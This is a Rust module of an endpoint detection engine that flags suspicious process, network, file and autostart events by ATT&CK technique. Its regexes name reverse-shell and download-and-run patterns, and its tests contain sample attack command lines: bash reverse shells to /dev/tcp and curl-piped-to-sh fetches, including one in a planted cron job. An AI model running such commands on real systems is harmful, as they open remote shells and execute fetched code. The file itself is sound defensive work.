use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

use regex::Regex;
use zedr_protocol::{FileAction, FileEvent, InventoryAction, NetworkEvent, PersistenceEvent, PersistenceKind, ProcessAction, ProcessEvent, SystemEvent};

use crate::hunt::kind_name;

pub const INCIDENT_PREFIX: &str = "detection.";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Level {
    High,
    Medium,
}

impl Level {
    fn as_str(self) -> &'static str {
        match self {
            Level::High => "high",
            Level::Medium => "medium",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Rule {
    pub id: &'static str,
    pub title: &'static str,
    pub technique: &'static str,
    pub level: Level,
}

const OFFICE_CHILD: Rule = Rule { id: "office-child", title: "Office application started a script host", technique: "T1204.002", level: Level::High };
const SERVER_CHILD: Rule = Rule { id: "server-child", title: "Server process started a shell", technique: "T1505.003", level: Level::High };
const ENCODED_COMMAND: Rule = Rule { id: "encoded-command", title: "Encoded PowerShell command", technique: "T1059.001", level: Level::High };
const REVERSE_SHELL: Rule = Rule { id: "reverse-shell", title: "Shell wired to a socket", technique: "T1059.004", level: Level::High };
const FETCH_AND_RUN: Rule = Rule { id: "fetch-and-run", title: "Download piped into execution", technique: "T1105", level: Level::High };
const PROXY_NETWORK: Rule = Rule { id: "proxy-network", title: "System binary reached the network", technique: "T1218", level: Level::High };
const PROXY_LOADS_WRITABLE: Rule = Rule { id: "proxy-loads-writable", title: "System binary loaded code from a user-writable folder", technique: "T1218.011", level: Level::High };
const WRITABLE_IMAGE: Rule = Rule { id: "writable-image", title: "Runs from a user-writable folder", technique: "T1204.002", level: Level::High };
const DROPS_EXECUTABLE: Rule = Rule { id: "drops-executable", title: "Script host wrote an executable file", technique: "T1105", level: Level::High };
const HIDDEN_WINDOW: Rule = Rule { id: "hidden-window", title: "Hidden window", technique: "T1564.003", level: Level::Medium };
const SHELL_NETWORK: Rule = Rule { id: "shell-network", title: "Shell with an outbound connection", technique: "T1071", level: Level::Medium };

const AUTOSTART_FETCH: Rule = Rule { id: "autostart-fetch", title: "Autostart item downloads and runs code", technique: "T1547", level: Level::High };
const AUTOSTART_WRITABLE: Rule = Rule { id: "autostart-writable", title: "Autostart item runs from a temporary folder", technique: "T1547", level: Level::High };
const PRELOAD_ADDED: Rule = Rule { id: "preload-added", title: "Library preloaded into every process", technique: "T1574.006", level: Level::High };
const ROOT_KEY_ADDED: Rule = Rule { id: "root-key-added", title: "SSH key added for root", technique: "T1098.004", level: Level::Medium };

const LIVE_LIMIT: usize = 20_000;

fn autostart_technique(kind: PersistenceKind) -> &'static str {
    match kind {
        PersistenceKind::SystemdUnit => "T1543.002",
        PersistenceKind::SystemdTimer => "T1053.006",
        PersistenceKind::Cron => "T1053.003",
        PersistenceKind::ShellProfile => "T1546.004",
        PersistenceKind::AuthorizedKey => "T1098.004",
        PersistenceKind::LdPreload => "T1574.006",
        PersistenceKind::RcLocal | PersistenceKind::InitScript => "T1037.004",
    }
}

const OFFICE: &[&str] = &[
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe", "msaccess.exe", "mspub.exe", "visio.exe", "acrord32.exe",
    "acrobat.exe", "soffice.bin", "microsoft word", "microsoft excel", "microsoft powerpoint", "microsoft outlook",
];
const SHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "pwsh", "cmd.exe", "wscript.exe", "cscript.exe", "bash", "sh", "zsh", "dash", "fish", "osascript"];
const PROXIES: &[&str] = &[
    "rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "msiexec.exe", "installutil.exe", "wmic.exe", "cmstp.exe",
    "odbcconf.exe",
];
const SERVERS: &[&str] = &["w3wp.exe", "sqlservr.exe", "httpd", "apache2", "nginx", "php-fpm", "postgres", "mysqld", "mariadbd", "redis-server", "mongod"];
const POWERSHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "pwsh"];

fn pattern(source: &str) -> Regex {
    Regex::new(source).expect("detection pattern is valid")
}

static WRITABLE: LazyLock<Regex> = LazyLock::new(|| {
    pattern(r"(?i)\\users\\public\\|\\appdata\\local\\temp\\|\\windows\\temp\\|\\downloads\\|^/tmp/|\s/tmp/|/dev/shm/|/var/tmp/|/downloads/")
});
static DROPPED: LazyLock<Regex> = LazyLock::new(|| pattern(r"(?i)\.(dll|exe|sys|scr|ps1|vbs|jse?|bat|cmd|hta|lnk|so|dylib|sh|elf|jar)$"));
static ENCODED: LazyLock<Regex> = LazyLock::new(|| pattern(r"(?i)\s-e(c|nc|nco\w*)?\s+[a-z0-9+/=]{8,}|frombase64string"));
static HIDDEN: LazyLock<Regex> = LazyLock::new(|| pattern(r"(?i)\s-w(in|indowstyle)?\s+h(idden)?\b"));
static REVERSE: LazyLock<Regex> = LazyLock::new(|| {
    pattern(r"(?i)/dev/(tcp|udp)/|\bn(c|cat)\b.*\s-e\s|\bbash\s+-i\b|\bsocat\b.*\bexec\b|\bmkfifo\b.*\bn(c|cat)\b")
});
static FETCHED: LazyLock<Regex> = LazyLock::new(|| {
    pattern(r"(?i)\b(curl|wget)\b[^|]*\|\s*(ba|z|da)?sh\b|\biex\b|invoke-expression|downloadstring|certutil(\.exe)?\s.*-urlcache|bitsadmin(\.exe)?\s.*/transfer")
});

fn base_name(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_lowercase()
}

#[derive(Debug, Clone)]
struct Process {
    name: String,
    path: String,
    command: String,
    parent: Option<String>,
    parent_path: Option<String>,
    grandparent: Option<String>,
    started_at: u64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Described {
    pub name: String,
    pub path: String,
    pub command: String,
    pub parent_name: Option<String>,
    pub parent_path: Option<String>,
    pub grandparent_name: Option<String>,
    pub started_at: u64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Detection {
    pub rule: Rule,
    pub pid: u32,
    pub started_at: u64,
    pub image: String,
    pub command: String,
    pub parent: Option<String>,
    pub subject: Option<String>,
    pub autostart: Option<&'static str>,
}

impl Detection {
    pub fn incident_type(&self) -> String {
        format!("{}{}", INCIDENT_PREFIX, self.rule.id)
    }

    pub fn evidence(&self) -> serde_json::Value {
        serde_json::json!({
            "rule": self.rule.id,
            "title": self.rule.title,
            "technique": self.rule.technique,
            "level": self.rule.level.as_str(),
            "pid": self.pid,
            "started_at": self.started_at,
            "image": self.image,
            "command": self.command,
            "parent": self.parent,
            "subject": self.subject,
            "autostart": self.autostart,
        })
    }
}

#[derive(Default)]
struct AgentProcesses {
    live: HashMap<u32, Process>,
    fired: HashSet<(&'static str, u32, u64)>,
    fired_items: HashSet<(&'static str, String)>,
}

#[derive(Default)]
pub struct Tracker {
    agents: HashMap<String, AgentProcesses>,
}

impl Tracker {
    pub fn observe(&mut self, agent_id: &str, event: &SystemEvent) -> Vec<Detection> {
        let agent = self.agents.entry(agent_id.to_string()).or_default();
        match event {
            SystemEvent::Process(process) => agent.process(process),
            SystemEvent::Network(connection) => agent.network(connection),
            SystemEvent::File(file) => agent.file(file),
            SystemEvent::Persistence(item) => agent.persistence(item),
            _ => Vec::new(),
        }
    }

    pub fn describe(&self, agent_id: &str, pid: u32) -> Option<Described> {
        let process = self.agents.get(agent_id)?.live.get(&pid)?;
        Some(Described {
            name: process.name.clone(),
            path: process.path.clone(),
            command: process.command.clone(),
            parent_name: process.parent.clone(),
            parent_path: process.parent_path.clone(),
            grandparent_name: process.grandparent.clone(),
            started_at: process.started_at,
        })
    }
}

impl AgentProcesses {
    fn forget(&mut self, pid: u32) {
        if let Some(ended) = self.live.remove(&pid) {
            self.fired.retain(|(_, fired_pid, started_at)| !(*fired_pid == pid && *started_at == ended.started_at));
        }
    }

    fn forget_oldest(&mut self) {
        let oldest = self.live.iter().min_by_key(|(pid, process)| (process.started_at, **pid)).map(|(pid, _)| *pid);
        if let Some(pid) = oldest {
            self.forget(pid);
        }
    }

    fn process(&mut self, event: &ProcessEvent) -> Vec<Detection> {
        if matches!(event.action, ProcessAction::Terminate) {
            self.forget(event.pid);
            return Vec::new();
        }

        let started_at = match (&event.action, self.live.get(&event.pid)) {
            (ProcessAction::Modify, Some(running)) => running.started_at,
            _ => event.timestamp,
        };
        let parent = self.live.get(&event.ppid).filter(|_| event.ppid != event.pid);
        let process = Process {
            name: base_name(&event.executable_path),
            path: event.executable_path.clone(),
            command: event.command_line.join(" "),
            parent: parent.map(|parent| parent.name.clone()),
            parent_path: parent.map(|parent| parent.path.clone()),
            grandparent: parent.and_then(|parent| parent.parent.clone()),
            started_at,
        };

        let name = process.name.as_str();
        let parent = process.parent.as_deref().unwrap_or("");
        let arguments = process.command.split_once(' ').map(|(_, rest)| rest).unwrap_or("");
        let scripted = SHELLS.contains(&name) || PROXIES.contains(&name);
        let mut matched = Vec::new();
        if scripted && OFFICE.contains(&parent) {
            matched.push(OFFICE_CHILD);
        }
        if SHELLS.contains(&name) && SERVERS.contains(&parent) {
            matched.push(SERVER_CHILD);
        }
        if POWERSHELLS.contains(&name) && ENCODED.is_match(&process.command) {
            matched.push(ENCODED_COMMAND);
        }
        if REVERSE.is_match(&process.command) {
            matched.push(REVERSE_SHELL);
        }
        if FETCHED.is_match(&process.command) {
            matched.push(FETCH_AND_RUN);
        }
        if PROXIES.contains(&name) && WRITABLE.is_match(arguments) {
            matched.push(PROXY_LOADS_WRITABLE);
        }
        if WRITABLE.is_match(&process.path) {
            matched.push(WRITABLE_IMAGE);
        }
        if SHELLS.contains(&name) && HIDDEN.is_match(&process.command) {
            matched.push(HIDDEN_WINDOW);
        }

        if self.live.len() >= LIVE_LIMIT && !self.live.contains_key(&event.pid) {
            self.forget_oldest();
        }
        self.live.insert(event.pid, process);
        matched.into_iter().filter_map(|rule| self.fire(rule, event.pid, None)).collect()
    }

    fn network(&mut self, event: &NetworkEvent) -> Vec<Detection> {
        let Some(process) = self.live.get(&event.pid) else {
            return Vec::new();
        };
        let name = process.name.as_str();
        let rule = if PROXIES.contains(&name) {
            PROXY_NETWORK
        } else if SHELLS.contains(&name) {
            SHELL_NETWORK
        } else {
            return Vec::new();
        };
        let remote = format!("{}:{}", event.dest_ip, event.dest_port);
        self.fire(rule, event.pid, Some(remote)).into_iter().collect()
    }

    fn file(&mut self, event: &FileEvent) -> Vec<Detection> {
        let writes = !matches!(event.action, FileAction::Read | FileAction::Delete);
        let Some(process) = self.live.get(&event.pid) else {
            return Vec::new();
        };
        if !writes || !SHELLS.contains(&process.name.as_str()) || !DROPPED.is_match(&event.path) {
            return Vec::new();
        }
        self.fire(DROPS_EXECUTABLE, event.pid, Some(event.path.clone())).into_iter().collect()
    }

    fn fire(&mut self, rule: Rule, pid: u32, subject: Option<String>) -> Option<Detection> {
        let process = self.live.get(&pid)?;
        if !self.fired.insert((rule.id, pid, process.started_at)) {
            return None;
        }
        Some(Detection {
            rule,
            pid,
            started_at: process.started_at,
            image: process.path.clone(),
            command: process.command.clone(),
            parent: process.parent.clone(),
            subject,
            autostart: None,
        })
    }

    fn persistence(&mut self, event: &PersistenceEvent) -> Vec<Detection> {
        let item = format!("{}|{}|{}", kind_name(event.kind), event.path, event.name);
        if !matches!(event.action, InventoryAction::Present) {
            self.fired_items.retain(|(_, fired)| *fired != item);
        }
        if matches!(event.action, InventoryAction::Removed) {
            return Vec::new();
        }

        let fresh = matches!(event.action, InventoryAction::Added | InventoryAction::Changed);
        let by_kind = |rule: Rule| Rule { technique: autostart_technique(event.kind), ..rule };
        let mut matched = Vec::new();
        if FETCHED.is_match(&event.command) || REVERSE.is_match(&event.command) {
            matched.push(by_kind(AUTOSTART_FETCH));
        }
        if WRITABLE.is_match(&event.command) {
            matched.push(by_kind(AUTOSTART_WRITABLE));
        }
        if fresh && event.kind == PersistenceKind::LdPreload {
            matched.push(PRELOAD_ADDED);
        }
        if event.kind == PersistenceKind::AuthorizedKey && event.user == "root" && matches!(event.action, InventoryAction::Added) {
            matched.push(ROOT_KEY_ADDED);
        }

        if self.fired_items.len() >= LIVE_LIMIT {
            self.fired_items.clear();
        }
        matched
            .into_iter()
            .filter(|rule| self.fired_items.insert((rule.id, item.clone())))
            .map(|rule| Detection {
                rule,
                pid: 0,
                started_at: event.timestamp,
                image: event.path.clone(),
                command: event.command.clone(),
                parent: None,
                subject: Some(event.name.clone()),
                autostart: Some(kind_name(event.kind)),
            })
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use zedr_protocol::NetworkAction;

    const SYSTEM: &str = "C:\\Windows\\System32\\";

    fn run(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SystemEvent {
        let mut command_line = vec![path.to_string()];
        command_line.extend(args.iter().map(|arg| arg.to_string()));
        SystemEvent::Process(ProcessEvent { timestamp, pid, ppid, executable_path: path.to_string(), command_line, action: ProcessAction::Create, uid: 1000, hash: None })
    }

    fn end(timestamp: u64, pid: u32) -> SystemEvent {
        SystemEvent::Process(ProcessEvent {
            timestamp,
            pid,
            ppid: 0,
            executable_path: String::new(),
            command_line: Vec::new(),
            action: ProcessAction::Terminate,
            uid: 0,
            hash: None,
        })
    }

    fn connect(timestamp: u64, pid: u32) -> SystemEvent {
        SystemEvent::Network(NetworkEvent {
            timestamp,
            pid,
            process_path: String::new(),
            protocol: "tcp".to_string(),
            source_ip: "10.0.0.5".to_string(),
            source_port: 50000,
            dest_ip: "203.0.113.9".to_string(),
            dest_port: 443,
            action: NetworkAction::Connect,
            bytes_sent: 1,
            bytes_received: 1,
        })
    }

    fn write(timestamp: u64, pid: u32, path: &str) -> SystemEvent {
        SystemEvent::File(FileEvent { timestamp, path: path.to_string(), action: FileAction::Write, pid, process_path: String::new(), hash: None })
    }

    fn rules(tracker: &mut Tracker, events: &[SystemEvent]) -> Vec<&'static str> {
        events.iter().flat_map(|event| tracker.observe("agent-1", event)).map(|detection| detection.rule.id).collect()
    }

    #[test]
    fn test_macro_dropper_is_read_end_to_end() {
        let powershell = format!("{}WindowsPowerShell\\v1.0\\powershell.exe", SYSTEM);
        let rundll32 = format!("{}rundll32.exe", SYSTEM);
        let mut tracker = Tracker::default();
        let fired = rules(
            &mut tracker,
            &[
                run(1, 10, 0, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", &[]),
                run(2, 11, 10, &powershell, &["-nop", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"]),
                connect(3, 11),
                write(4, 11, "C:\\Users\\Public\\update.dll"),
                run(5, 12, 11, &rundll32, &["C:\\Users\\Public\\update.dll,Start"]),
                connect(6, 12),
            ],
        );
        assert_eq!(
            fired,
            vec!["office-child", "encoded-command", "hidden-window", "shell-network", "drops-executable", "proxy-loads-writable", "proxy-network"]
        );
    }

    #[test]
    fn test_web_shell_reverse_shell_and_dropped_binary_on_linux() {
        let mut tracker = Tracker::default();
        let fired = rules(
            &mut tracker,
            &[
                run(1, 20, 0, "/usr/sbin/nginx", &[]),
                run(2, 21, 20, "/bin/sh", &["-c", "id"]),
                run(3, 22, 21, "/bin/bash", &["-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"]),
                run(4, 23, 0, "/bin/sh", &["-c", "curl -s http://203.0.113.9/a | sh"]),
                run(5, 24, 0, "/tmp/.x/kworker", &[]),
            ],
        );
        assert_eq!(fired, vec!["server-child", "reverse-shell", "fetch-and-run", "writable-image"]);
    }

    #[test]
    fn test_ordinary_build_and_server_work_is_quiet() {
        let mut tracker = Tracker::default();
        let fired = rules(
            &mut tracker,
            &[
                run(1, 30, 0, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
                run(2, 31, 30, &format!("{}cmd.exe", SYSTEM), &["/c", "npm", "ci"]),
                run(3, 32, 31, "C:\\Program Files\\nodejs\\node.exe", &["install.js"]),
                connect(4, 32),
                run(5, 33, 0, "C:\\Python312\\python.exe", &["worker.py"]),
                connect(6, 33),
                run(7, 34, 0, "C:\\Program Files\\PowerShell\\7\\pwsh.exe", &[]),
                run(8, 35, 0, &format!("{}rundll32.exe", SYSTEM), &["C:\\Windows\\System32\\shell32.dll,Control_RunDLL"]),
                run(9, 36, 0, "/usr/bin/curl", &["-o", "/tmp/report.csv", "https://example.com/report.csv"]),
                write(10, 33, "C:\\Users\\Public\\result.dll"),
            ],
        );
        assert!(fired.is_empty(), "nothing should fire, got {:?}", fired);
    }

    #[test]
    fn test_a_finding_fires_once_per_process_even_when_the_agent_resends_it() {
        let mut tracker = Tracker::default();
        let shell = run(100, 40, 0, "/bin/bash", &["deploy.sh"]);
        assert_eq!(rules(&mut tracker, &[shell.clone(), connect(101, 40), connect(102, 40), shell, connect(103, 40)]), vec!["shell-network"]);

        assert_eq!(rules(&mut tracker, &[end(110, 40), run(120, 40, 0, "/bin/bash", &["deploy.sh"]), connect(121, 40)]), vec!["shell-network"]);
    }

    #[test]
    fn test_the_process_table_of_one_agent_stops_growing_at_its_limit() {
        let mut tracker = Tracker::default();
        let last = LIVE_LIMIT as u32 + 1;
        for pid in 1..=last {
            tracker.observe("agent-1", &run(u64::from(pid), pid, 0, "/usr/bin/sleep", &["60"]));
        }
        assert!(tracker.describe("agent-1", 1).is_none());
        assert!(tracker.describe("agent-1", 2).is_some());
        assert!(tracker.describe("agent-1", last).is_some());
    }

    fn autostart(action: InventoryAction, kind: PersistenceKind, name: &str, path: &str, command: &str, user: &str) -> SystemEvent {
        SystemEvent::Persistence(PersistenceEvent {
            timestamp: 500,
            action,
            kind,
            name: name.to_string(),
            path: path.to_string(),
            command: command.to_string(),
            user: user.to_string(),
            enabled: true,
            hash: None,
        })
    }

    #[test]
    fn test_planted_autostart_items_are_found_and_ordinary_ones_are_quiet() {
        let mut tracker = Tracker::default();
        let planted = autostart(InventoryAction::Added, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "* * * * * root curl -fsS http://203.0.113.47/u | sh", "root");
        let found = tracker.observe("agent-1", &planted);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].rule.id, "autostart-fetch");
        assert_eq!(found[0].rule.technique, "T1053.003");
        assert_eq!(found[0].evidence()["autostart"], "cron");
        assert_eq!(found[0].evidence()["subject"], "sysupdate");

        let resent = autostart(InventoryAction::Present, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "* * * * * root curl -fsS http://203.0.113.47/u | sh", "root");
        assert!(tracker.observe("agent-1", &resent).is_empty(), "an agent that starts again reports the item again");

        let quiet = [
            autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", "root"),
            autostart(InventoryAction::Added, PersistenceKind::Cron, "certbot", "/etc/cron.d/certbot", "0 */12 * * * root certbot -q renew", "root"),
            autostart(InventoryAction::Present, PersistenceKind::AuthorizedKey, "admin@laptop", "/root/.ssh/authorized_keys", "ssh-ed25519", "root"),
            autostart(InventoryAction::Present, PersistenceKind::LdPreload, "libjemalloc.so", "/etc/ld.so.preload", "/usr/lib/libjemalloc.so", "root"),
            autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "deploy@ci", "/home/deploy/.ssh/authorized_keys", "ssh-ed25519", "deploy"),
        ];
        assert!(rules(&mut tracker, &quiet).is_empty());

        let loud = [
            autostart(InventoryAction::Added, PersistenceKind::SystemdUnit, "dbus-helper.service", "/etc/systemd/system/dbus-helper.service", "/tmp/.cache/kworker", "root"),
            autostart(InventoryAction::Added, PersistenceKind::LdPreload, "libprocesshider.so", "/etc/ld.so.preload", "/usr/local/lib/libprocesshider.so", "root"),
            autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519", "root"),
        ];
        assert_eq!(rules(&mut tracker, &loud), ["autostart-writable", "preload-added", "root-key-added"]);
    }

    #[test]
    fn test_an_autostart_item_that_comes_back_is_reported_again() {
        let mut tracker = Tracker::default();
        let command = "bash -i >& /dev/tcp/203.0.113.47/443 0>&1";
        let item = |action| autostart(action, PersistenceKind::ShellProfile, ".bashrc", "/root/.bashrc", command, "root");
        assert_eq!(rules(&mut tracker, &[item(InventoryAction::Changed)]), ["autostart-fetch"]);
        assert!(rules(&mut tracker, &[item(InventoryAction::Removed)]).is_empty());
        assert_eq!(rules(&mut tracker, &[item(InventoryAction::Added)]), ["autostart-fetch"]);
    }

    #[test]
    fn test_processes_are_tracked_per_agent() {
        let mut tracker = Tracker::default();
        tracker.observe("agent-1", &run(1, 50, 0, "/usr/sbin/nginx", &[]));
        let other = tracker.observe("agent-2", &run(2, 51, 50, "/bin/sh", &["-c", "id"]));
        assert!(other.is_empty(), "a parent on another endpoint is not this shell's parent");
        let same = tracker.observe("agent-1", &run(3, 51, 50, "/bin/sh", &["-c", "id"]));
        assert_eq!(same.len(), 1);
        assert_eq!(same[0].parent.as_deref(), Some("nginx"));
    }

    #[test]
    fn test_evidence_names_the_rule_the_process_and_what_it_touched() {
        let mut tracker = Tracker::default();
        tracker.observe("agent-1", &run(1, 60, 0, &format!("{}rundll32.exe", SYSTEM), &["shell32.dll,Control_RunDLL"]));
        let detection = tracker.observe("agent-1", &connect(2, 60)).remove(0);
        assert_eq!(detection.incident_type(), "detection.proxy-network");
        let evidence = detection.evidence();
        assert_eq!(evidence["technique"], "T1218");
        assert_eq!(evidence["level"], "high");
        assert_eq!(evidence["pid"], 60);
        assert_eq!(evidence["subject"], "203.0.113.9:443");
        assert!(evidence["image"].as_str().unwrap().ends_with("rundll32.exe"));
    }
}
